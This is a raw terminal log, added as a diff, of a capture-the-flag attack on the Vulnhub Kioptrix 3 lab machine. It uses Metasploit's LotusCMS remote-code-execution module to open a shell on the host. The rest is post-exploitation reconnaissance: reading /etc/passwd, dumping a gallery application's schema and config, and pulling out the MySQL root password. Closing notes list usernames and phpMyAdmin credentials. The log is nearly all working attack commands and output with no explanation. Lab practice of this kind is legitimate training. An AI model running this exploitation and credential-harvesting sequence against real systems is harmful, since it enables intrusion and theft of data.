@@ -1,0 +1,357 @@
+root@Blue3:/media/Linux-Storage/[Github]/eblue3/CTF/Vulnhub/kioptrix3# msfconsole
+
+
+      .:okOOOkdc'           'cdkOOOko:.
+    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
+   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
+  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
+  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
+  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
+  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
+  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
+   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
+    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
+     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
+      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;
+       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.
+         ,kOl'M.OOOOOOOOOOOOO.M'dOk,
+           :kk;.OOOOOOOOOOOOO.;Ok:
+             ;kOOOOOOOOOOOOOOOk:
+               ,xOOOOOOOOOOOx,
+                 .lOOOOOOOl.
+                    ,dOd,
+                      .
+
+       =[ metasploit v5.0.101-dev                         ]
++ -- --=[ 2049 exploits - 1108 auxiliary - 344 post       ]
++ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: Save the current environment with the save command, future console restarts will use this environment again
+
+msf5 > use exploit/multi/http/lcms_php_exec
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf5 exploit(multi/http/lcms_php_exec) > set URI /
+URI => /
+msf5 exploit(multi/http/lcms_php_exec) > set RHOSTS 172.16.35.128
+RHOSTS => 172.16.35.128
+msf5 exploit(multi/http/lcms_php_exec) > set payload generic/shell_bind_tcp
+payload => generic/shell_bind_tcp
+msf5 exploit(multi/http/lcms_php_exec) > options
+
+Module options (exploit/multi/http/lcms_php_exec):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS   172.16.35.128    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT    80               yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   URI      /                yes       URI
+   VHOST                     no        HTTP server virtual host
+
+
+Payload options (generic/shell_bind_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LPORT  4444             yes       The listen port
+   RHOST  172.16.35.128    no        The target address
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic LotusCMS 3.0
+
+
+msf5 exploit(multi/http/lcms_php_exec) > set LHOST 172.16.35.1
+LHOST => 172.16.35.1
+msf5 exploit(multi/http/lcms_php_exec) > run
+
+[*] Using found page param: /index.php?page=index
+[*] Sending exploit ...
+[*] Started bind TCP handler against 172.16.35.128:4444
+[*] Command shell session 1 opened (0.0.0.0:0 -> 172.16.35.128:4444) at 2020-08-10 10:40:45 +0700
+
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+whoami
+www-data
+pwd
+/home/www/kioptrix3.com
+
+#
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+#
+
+ls -ltra
+total 92
+-rw-r--r--  1 root root 26430 Jan 21  2007 gnu-lgpl.txt
+-rw-r--r--  1 root root 23126 Jun  5  2009 favicon.ico
+-rw-r--r--  1 root root   243 Aug  5  2010 update.php
+-rw-r--r--  1 root root   399 Feb 23  2011 index.php
+drwxr-xr-x  3 root root  4096 Apr 12  2011 ..
+drwxr-xr-x  7 root root  4096 Apr 14  2011 gallery
+drwxrwxrwx  8 root root  4096 Apr 14  2011 data
+drwxrwxrwx  8 root root  4096 Apr 14  2011 core
+drwxrwxrwx 10 root root  4096 Apr 14  2011 modules
+drwxrwxrwx  3 root root  4096 Apr 14  2011 style
+drwxrwxrwx  2 root root  4096 Apr 15  2011 cache
+drwxr-xr-x  8 root root  4096 Apr 15  2011 .
+
+lsb_release -a
+Distributor ID:	Ubuntu
+Description:	Ubuntu 8.04.3 LTS
+Release:	8.04
+Codename:	hardy
+
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+dhcp:x:101:102::/nonexistent:/bin/false
+syslog:x:102:103::/home/syslog:/bin/false
+klog:x:103:104::/home/klog:/bin/false
+mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false
+sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash
+dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash
+
+ls -ltra gallery
+total 164
+-rw-r--r-- 1 root root  3573 Oct 10  2009 db.sql
+-rw-r--r-- 1 root root    87 Oct 10  2009 readme.html
+-rw-r--r-- 1 root root    56 Oct 10  2009 version.txt
+drwxr-xr-x 3 root root  4096 Apr 12  2011 gadmin
+drwxr-xr-x 6 root root  4096 Apr 12  2011 themes
+-rw-r--r-- 1 root root   249 Apr 12  2011 index.php
+-rw-r--r-- 1 root root   252 Apr 12  2011 g.php
+-rw-r--r-- 1 root root  1009 Apr 12  2011 gheader.php
+-rw-r--r-- 1 root root   213 Apr 12  2011 logout.php
+-rw-r--r-- 1 root root   249 Apr 12  2011 p.php
+-rw-r--r-- 1 root root   214 Apr 12  2011 gallery.php
+-rw-r--r-- 1 root root   219 Apr 12  2011 post_comment.php
+-rw-r--r-- 1 root root   213 Apr 12  2011 recent.php
+-rw-r--r-- 1 root root   211 Apr 12  2011 tags.php
+-rw-r--r-- 1 root root 38771 Apr 12  2011 gfunctions.php
+-rw-r--r-- 1 root root   213 Apr 12  2011 photos.php
+-rw-r--r-- 1 root root 10340 Apr 12  2011 install.BAK
+-rw-r--r-- 1 root root   216 Apr 12  2011 slideshow.php
+-rw-r--r-- 1 root root   211 Apr 12  2011 vote.php
+-rw-r--r-- 1 root root   214 Apr 12  2011 profile.php
+-rw-r--r-- 1 root root   215 Apr 12  2011 register.php
+-rw-r--r-- 1 root root   213 Apr 12  2011 search.php
+drwxr-xr-x 2 root root  4096 Apr 12  2011 BACK
+-rw-r--r-- 1 root root   212 Apr 12  2011 login.php
+-rw-r--r-- 1 root root   297 Apr 12  2011 gfooter.php
+drwxrwxrwx 2 root root  4096 Apr 12  2011 photos
+drwxr-xr-x 2 root root  4096 Apr 13  2011 scopbin
+drwxr-xr-x 7 root root  4096 Apr 14  2011 .
+-rw-r--r-- 1 root root  1440 Apr 14  2011 gconfig.php
+drwxr-xr-x 8 root root  4096 Apr 15  2011 ..
+
+cat gallery/db.sql
+CREATE TABLE IF NOT EXISTS `gallarific_comments` (
+  `commentid` int(11) NOT NULL auto_increment,
+  `photoid` int(11) NOT NULL default '0',
+  `name` varchar(100) NOT NULL default '',
+  `email` varchar(250) NOT NULL default '',
+  `comment` text  NOT NULL,
+  `dateadded` int(11) NOT NULL default '0',
+  `status` tinyint(4) NOT NULL default '0',
+  `link` varchar(255)  NOT NULL default '',
+  `userid` int(11) NOT NULL default '0',
+  PRIMARY KEY  (`commentid`)
+);
+
+CREATE TABLE IF NOT EXISTS `gallarific_galleries` (
+  `galleryid` int(11) NOT NULL auto_increment,
+  `name` varchar(100) NOT NULL default '',
+  `description` varchar(255) NOT NULL default '',
+  `created` int(11) NOT NULL default '0',
+  `parentid` int(11) NOT NULL default '0',
+  `sort` int(11) NOT NULL default '0',
+  PRIMARY KEY  (`galleryid`)
+);
+
+CREATE TABLE IF NOT EXISTS `gallarific_photos` (
+  `photoid` int(11) NOT NULL auto_increment,
+  `galleryid` int(11) NOT NULL default '0',
+  `filename` varchar(100) NOT NULL default '',
+  `title` varchar(255) NOT NULL default '',
+  `description` varchar(255) NOT NULL default '',
+  `size` int(11) NOT NULL default '0',
+  `dateuploaded` int(11) NOT NULL default '0',
+  `views` int(11) NOT NULL default '0',
+  `userid` int(11) NOT NULL default '0',
+  `status` tinyint(4) NOT NULL default '0',
+  `tags` varchar(255) NOT NULL default '',
+  `votetotal` int(11) NOT NULL,
+  `votecount` int(11) NOT NULL,
+  PRIMARY KEY  (`photoid`)
+);
+
+CREATE TABLE IF NOT EXISTS `gallarific_stats` (
+  `ID` int(11) NOT NULL auto_increment,
+  `Var01` varchar(255) NOT NULL default '0',
+  `Var02` varchar(255) NOT NULL default '0',
+  `Var03` varchar(255) NOT NULL default '',
+  `Var04` varchar(255) NOT NULL default '',
+  `Var05` varchar(255) NOT NULL default '',
+  `Var06` varchar(255) NOT NULL default '',
+  `Var07` varchar(255) NOT NULL default '',
+  `Var08` varchar(255) NOT NULL default '',
+  `Var09` varchar(255) NOT NULL default '',
+  `Var10` varchar(255) NOT NULL default '',
+  `Var11` varchar(255) NOT NULL default '',
+  `Var12` varchar(255) NOT NULL default '',
+  `Var13` varchar(255) NOT NULL default '',
+  `Var14` varchar(255) NOT NULL default '',
+  `Var15` varchar(255) NOT NULL default '',
+  `Var16` varchar(255) NOT NULL default '',
+  `Var17` varchar(255) NOT NULL default '',
+  `Var18` varchar(255) NOT NULL default '',
+  `Var19` varchar(255) NOT NULL default '',
+  `Var20` varchar(255) NOT NULL default '',
+  `Var21` varchar(255) NOT NULL default '',
+  `Var22` varchar(255) NOT NULL default '',
+  `Var23` varchar(255) NOT NULL default '',
+  PRIMARY KEY  (`ID`)
+) AUTO_INCREMENT=1;
+
+CREATE TABLE IF NOT EXISTS `gallarific_users` (
+  `userid` int(11) NOT NULL auto_increment,
+  `username` varchar(100) NOT NULL default '',
+  `password` varchar(100) NOT NULL default '',
+  `usertype` enum('superuser','normaluser') NOT NULL default 'superuser',
+  `firstname` varchar(100) NOT NULL default '',
+  `lastname` varchar(100) NOT NULL default '',
+  `email` varchar(255) NOT NULL default '',
+  `datejoined` int(11) NOT NULL default '0',
+  `website` varchar(255) NOT NULL default '',
+  `issuperuser` tinyint(4) NOT NULL default '0',
+  `photo` varchar(100) NOT NULL default '',
+  `joincode` varchar(20) NOT NULL default '',
+  PRIMARY KEY  (`userid`)
+);
+
+CREATE TABLE IF NOT EXISTS `gallarific_settings` (
+  `settings_id` int(11) NOT NULL auto_increment,
+  `settings_name` varchar(100) NOT NULL default '',
+  `settings_value` varchar(100) NOT NULL default '',
+  PRIMARY KEY  (`settings_id`)
+);
+
+cat gallery/gheader.php
+<?php
+
+// ------------------------------------------------------------------
+
+    @ob_start();
+    @set_time_limit(0);
+//     @error_reporting(2047);
+    @session_start();
+    error_reporting(E_ALL ^ E_NOTICE);
+    // Include the Gallarific functions file
+    include(dirname(__FILE__) . "/gfunctions.php");
+
+    // Is there a config file?
+    ginstallcheck1();
+
+    // Include the Gallarific config file
+    include(dirname(__FILE__) . "/gconfig.php");
+
+    // Has the database been built?
+    ginstallcheck2();
+
+    // Create a constant for the path to the selected theme
+    define("THEME_PATH", "themes/" . $GLOBALS["gallarific_theme"] . "/");
+
+    // Connect to MySQL
+    gmysql();
+
+    // Fix the gallery path
+    if(substr($GLOBALS["gallarific_path"], strlen($GLOBALS["gallarific_path"])-1, 1) != "/")
+        $GLOBALS["gallarific_path"] .= "/";
+    // Include all standard theme files
+    include(THEME_PATH . "header.php");
+
+// ------------------------------------------------------------------
+
+?>
+
+cat gallery/gconfig.php
+<?php
+	error_reporting(0);
+	/*
+		A sample Gallarific configuration file. You should edit
+		the installer details below and save this file as gconfig.php
+		Do not modify anything else if you don't know what it is.
+	*/
+
+	// Installer Details -----------------------------------------------
+
+	// Enter the full HTTP path to your Gallarific folder below,
+	// such as http://www.yoursite.com/gallery
+	// Do NOT include a trailing forward slash
+
+	$GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";
+
+	$GLOBALS["gallarific_mysql_server"] = "localhost";
+	$GLOBALS["gallarific_mysql_database"] = "gallery";
+	$GLOBALS["gallarific_mysql_username"] = "root";
+	$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
+
+	// Setting Details -------------------------------------------------
+
+if(!$g_mysql_c = @mysql_connect($GLOBALS["gallarific_mysql_server"], $GLOBALS["gallarific_mysql_username"], $GLOBALS["gallarific_mysql_password"])) {
+		echo("A connection to the database couldn't be established: " . mysql_error());
+		die();
+}else {
+	if(!$g_mysql_d = @mysql_select_db($GLOBALS["gallarific_mysql_database"], $g_mysql_c)) {
+		echo("The Gallarific database couldn't be opened: " . mysql_error());
+		die();
+	}else {
+		$settings=mysql_query("select * from gallarific_settings");
+		if(mysql_num_rows($settings)!=0){
+			while($data=mysql_fetch_array($settings)){
+				$GLOBALS["{$data['settings_name']}"]=$data['settings_value'];
+			}
+		}
+
+	}
+}
+
+?>
+
+#
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
+  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
+#
+
+=> user: loneferret + dreg (SSH)
+=> mysql_username: root
+=> mysql_password: fuckeyou
+=> http://kioptrix3.com/phpmyadmin/ (root / fuckeyou)
